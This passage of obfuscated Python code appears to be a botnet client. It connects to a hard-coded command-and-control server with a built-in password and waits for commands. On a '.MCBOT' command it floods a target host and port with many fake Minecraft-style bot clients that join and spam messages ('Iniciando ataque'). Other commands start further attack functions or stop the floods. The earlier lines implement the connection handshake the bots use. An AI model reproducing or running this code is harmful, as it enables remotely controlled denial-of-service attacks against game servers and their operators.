						while R+1<D(X)and X[R+1]==X[R]+1:R+=1;T=X[R]
						d.append((O,T));R+=1
					e=K().u8(192).u16be(D(d))
					for(O,T)in d:e.u8(1).t_le(O)if O==T else e.u8(0).t_le(O).t_le(T)
					Z(B,e.buf());B[x]=[]
				continue
			if W==6 and B[P]==AB:
				if D(A)>=2:p=M.unpack_from('>H',A,D(A)-2)[0];B[s]=p if 576<=p<=1500 else 1400
				B[P]=l
				if B[V]:B[V].cancel();B[V]=J
				q=K().u8(7).magic().rak_ip(host,port).u16be(B[s]).u64be(B[c]).buf();Z(B,q);B[n]=L
				def r():
					if B[P]!=l or B[F]:return
					B[n]=not B[n];Z(B,q);A=N.Timer(2.,r);A.daemon=E;A.start();B[f]=A
				g=N.Timer(2.,r);g.daemon=E;g.start();B[f]=g;continue
			if W==8 and B[P]==l:
				if B[f]:B[f].cancel();B[f]=J
				B[P]=Ap;m(B,K().u8(9).u64be(B[c]).i64be(H(C.time()*1000)).u8(0).buf(),L,0,0,0);continue
			if W==28 and B[P]==h:
				try:
					j=b(A);j.skip(33);z=j.bytes_(j.u16be()).decode(S,errors=Am);k=z.split(';')
					if D(k)>=3 and k[2].isdigit():
						t=H(k[2])
						if t>0:B[U]=t
				except:pass
				if B[V]:B[V].cancel();B[V]=J
				B[P]=AB;AF(B);AH(B);continue
	N.Thread(target=R,daemon=E).start();O=[0]
	def W():
		while B[P]==h and not B[F]and not I:
			C.sleep(.5);O[0]+=1
			if O[0]>=4:
				if B[P]==h:B[U]=70;B[P]=AB;AF(B);AH(B)
				return
			Z(B,K().u8(1).i64be(H(C.time()*1000)).magic().u64be(B[c]).buf())
	N.Thread(target=W,daemon=E).start();return B
def BX(host,port,nombre,cantidad,tiempo,register_cmd,mensajes_raw,intervalo):
	M=mensajes_raw;K=nombre;J=intervalo;B=cantidad;A=tiempo;global a,I
	try:
		B=H(B);A=H(A);J=H(J);N=[A.strip().replace('-',' ')for A in M.split('|')if A.strip()]if M else['Hola!'];O(f"[MCBot] Iniciando ataque a {host}:{port}");O(f"[MCBot] Bots: {B}, Tiempo: {A}s, Nombre: {K}")
		for R in G(B):
			if I:break
			D=BW(host,port,K,register_cmd,N,J)
			with AC:a.append(D)
			C.sleep(.3)
		if A>0:
			C.sleep(A);I=E
			with AC:
				for D in a[:]:
					D[F]=E
					try:D[Q].close()
					except:pass
				a.clear()
			I=L
		return E
	except n as P:O(f"[MCBot] Error: {P}");return L
def BY():
	global a,I;I=E
	with AC:
		for A in a[:]:
			A[F]=E
			try:A[Q].close()
			except:pass
		a.clear()
def BZ():
	Q='MCBOT';global I
	while E:
		try:
			F=A.socket(A.AF_INET,A.SOCK_STREAM);F.setsockopt(A.SOL_SOCKET,A.SO_KEEPALIVE,1);F.settimeout(10);O(f"[*] Conectando a {AT}:{AU}...");F.connect((AT,AU));O('[+] Conectado!');G=0
			while G<2:
				try:
					J=F.recv(1024).decode()
					if'Username'in J:F.send(BE().encode());G=1
					elif'Password'in J and G==1:F.send('ÿÿÿÿ='.encode('cp1252'));G=2
				except A.timeout:continue
				except:break
			if G<2:raise n('Auth failed')
			O('✅ Autenticado!')
			while E:
				try:
					J=F.recv(1024).decode().strip()
					if not J:continue
					B=J.split(' ');M=B[0].upper()
					if M=='PING':F.send('PONG'.encode())
					elif M=='STOP'and D(B)>1:
						K=B[1];BG(K)
						if K==Q or Q in K:BY();I=L
					elif M=='.MCBOT':
						if D(B)>=9:R=B[1];P=H(B[2]);S=B[3];T=H(B[4]);U=H(B[5]);V=B[6];W=B[7];X=H(B[8]);I=L;N.Thread(target=BX,args=(R,P,S,T,U,V,W,X),daemon=E).start()
					elif D(B)>=4:Y=M;Z=B[1];P=H(B[2]);a=H(B[3]);b=H(B[4])if D(B)>=5 else 1;K=B[5]if D(B)>=6 else'default';BF(Y,Z,P,a,b,K)
				except A.timeout:continue
				except:break
			F.close()
		except n as c:O(f"❌ Error: {c}")
		O(f"[*] Reintentando en {AV} segundos...");C.sleep(AV)
if __name__=='__main__':
	try:BZ()
	except KeyboardInterrupt:O('\n🛑 Detenido');sys.exit(0)
	except:pass
